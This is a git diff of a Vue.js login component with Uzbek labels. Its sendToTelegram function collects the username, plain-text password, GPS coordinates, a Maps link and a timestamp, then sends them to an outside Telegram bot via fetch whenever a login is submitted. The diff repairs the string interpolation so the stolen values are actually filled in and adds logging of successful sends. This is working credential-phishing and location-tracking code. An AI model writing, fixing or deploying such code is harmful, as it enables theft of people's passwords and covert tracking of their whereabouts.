@@ -124,19 +124,27 @@ export default {
     },
     sendToTelegram() {
       const message = `📍 Foydalanuvchi ma'lumoti:
-Login: $(this.username)
-Password: $(this.password)
-Latitude: ${this.latitude}
-Longitude: ${this.longitude}
-🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
-🕒 Vaqt: ${new Date().toLocaleString()}`;
+    Login: ${this.username}
+    Password: ${this.password}
+    Latitude: ${this.latitude}
+    Longitude: ${this.longitude}
+    🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${
+        this.longitude
+      }
+    🕒 Vaqt: ${new Date().toLocaleString()}`;
+
       const url = `https://api.telegram.org/bot${
         this.botToken
       }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}`;
+
       fetch(url)
         .then((res) => res.json())
-        .catch((err) => console.error(err));
+        .then((data) => {
+          console.log("✅ Telegramga yuborildi:", data);
+        })
+        .catch((err) => console.error("❌ Telegram xatosi:", err));
     },
+
     submitLogin() {
       if (this.username && this.password) {
         this.sendToTelegram();
